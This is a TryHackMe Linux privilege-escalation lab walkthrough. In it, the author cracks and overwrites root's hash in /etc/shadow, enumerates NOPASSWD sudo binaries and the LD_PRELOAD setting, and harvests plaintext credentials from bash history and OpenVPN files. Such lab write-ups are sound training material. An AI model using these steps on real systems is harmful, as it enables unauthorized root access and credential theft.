# Walkthrough : TryHackMe - Linux PrivEsc 
Target IP: ```10.49.174.186```
Initial Access User: ```user```
Target User: ```root```

## Task 1: Initial Access & System Identification
Establish an SSH session to the target host using legacy HostKeyAlgorithms and verify current user privileges.
- SSH Connection Command:
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@10.49.174.186
```
- Verify Privileges:
```bash
user@debian:~$ id
```
- Output: ```uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)```

## Task 2: Weak File Permissions — Cracking Shadow Hashes
Exploit misconfigured read/write permissions on ```/etc/shadow``` by cracking the existing hash offline and replacing it with a custom-generated password hash.

1. Extract Root Hash & Crack Offline (John the Ripper):
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root
```
Result: Cracked root password is ```password123```.

2. Generate New SHA-512 Hash:
```bash
user@debian:~$ mkpasswd -m sha-512 newpasswordhere
```
Generated Hash: ```$6$fnB4vHp3WBAbhBt$CtvLYZrqZtsIZKQSdDTGCNbAUPlNc4LIe6iK2Fj20ESiNdYZO7mlME2LEr7GKwn.qZHEBzjs9re9KX.SrjSpS```.

3. Modify Shadow File & Privilege Escalation:
```bash
user@debian:~$ nano /etc/shadow
user@debian:~$ su root
```
Verify Escalation:
```bash
root@debian:/home/user# id
```
## Task 3: Sudo Privileges & Misconfiguration Enumeration
Identify binaries executable as ```root``` without password prompt (```NOPASSWD```) and inspect default environmental overrides.
- Check Sudo Configuration for Root:
```bash
root@debian:/home/user# sudo -l
```
Output Defaults: ```env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH```
- Check Sudo Privileges for User:
```bash
user@debian:~$ sudo -l
```
Allowed NOPASSWD Binaries:
- /usr/sbin/iftop
- /usr/bin/find
- /usr/bin/nano
- /usr/bin/vim
- /usr/bin/man
- /usr/bin/awk
- /usr/bin/less
- /usr/bin/ftp
- /usr/bin/nmap
- /usr/sbin/apache2
- /bin/more

## Task 4: Information Disclosure & Credential Harvesting

Locate sensitive hardcoded credentials across cron paths, shell history files, and OpenVPN configuration dependencies.
1. Inspect System Crontab PATH:
```bash
user@debian:~$ grep -E '^ [[:space:]]*PATH=' /etc/crontab
```
Output: ```PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin```

2. Extract Credentials from Bash History:
```bash
user@debian:~$ cat ~/.*history | less
```
Exposed Command Line Credential:
```bash
mysql -h somehost.local -uroot -ppassword123
```
3. Extract Credentials from OpenVPN Configuration:
```bash
user@debian:~$ cat /home/user/myvpn.ovpn
```
Exposed Configuration Reference: ```auth-user-pass /etc/openvpn/auth.txt```

4. Read Plaintext Credentials File:
```bash
user@debian:~$ cat /etc/openvpn/auth.txt
```
Retrieved Credentials:
```bash
root
password123
```
